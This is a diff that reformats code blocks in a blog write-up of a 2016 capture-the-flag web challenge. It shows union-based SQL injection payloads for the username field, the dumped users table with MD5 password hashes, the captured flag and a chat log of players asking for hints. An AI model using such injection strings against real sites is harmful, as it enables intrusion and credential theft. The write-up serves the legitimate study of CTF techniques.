@@ -31,7 +31,8 @@ The web100 task was a simple webpage that is shown below:
 
 ![](content/images/2016/10/Zrzut-ekranu-2016-10-28-o-21.38.50.webp)
 You could very quickly find out that there's an SQL injection in the username field. But the more you look through the objects in the DB the more there was an impression that there is no flag there. And you could leak a lot from the DB. Everything in the `users` table:
-[code]
+
+```
     1 ferchu_papijas      17c4520f6cfd1ab53d8745e84681eb49
     2 el_peluca           5eb63bbbe01eeed093cb22bb8f5acdc3
     3 grandfather_fataku  8cbf64e506adb380e4938ee18c1def03
@@ -39,12 +40,13 @@ You could very quickly find out that there's an SQL injection in the username fi
     5 ana_lisa_melchotto  b5c0b187fe309af0f4d35982fd961d7e
     6 rosa_meltroso       33ee7e1eb504b6619c1b445ca1442c21
     7 mj_sex_machine      5f4dcc3b5aa765d61d8327deb882cf99
-[/code]
+```
 
 `rosa_meltroso'/**/union/**/select/**/username,password/**/from/**/users#`
 
 or ENGINES installed in mysql:
-[code]
+
+```
     1	CSV
     1	MRG_MYISAM
     1	MyISAM
@@ -54,7 +56,7 @@ or ENGINES installed in mysql:
     1	ARCHIVE
     1	MEMORY
     1	FEDERATED
-[/code]
+```
 
 `rosa_meltroso'/**/union/**/SELECT/**/1,ENGINE/**/FROM/**/INFORMATION_SCHEMA.ENGINES#`
 
@@ -71,7 +73,8 @@ You could dump all the data but there was no flag! I was going to write a tool t
 and surprise, surprise - I got the flag (`EKO{do_not_forget_session_variables}`). Great!
 
 This task was quite fun and looks like it was a bit of a challenge for people as one could see a lot of requests for a hint.
-[code]
+
+```
     [14:19]  are there any hints on web100?
     [14:32]  who is the admin for web 100?
     [15:03]   web 100..
@@ -94,7 +97,7 @@ This task was quite fun and looks like it was a bit of a challenge for people as
     [18:54]  yep, web100... not sure I understand the hint... :/ I'll wait for them to be back though :)
     [11:26]  hi ! can someone tell me what's web100
     [11:26]  ?
-[/code]
+```
 
 I think I was 3rd (or somewhere around that) person who solved the challenge.
 
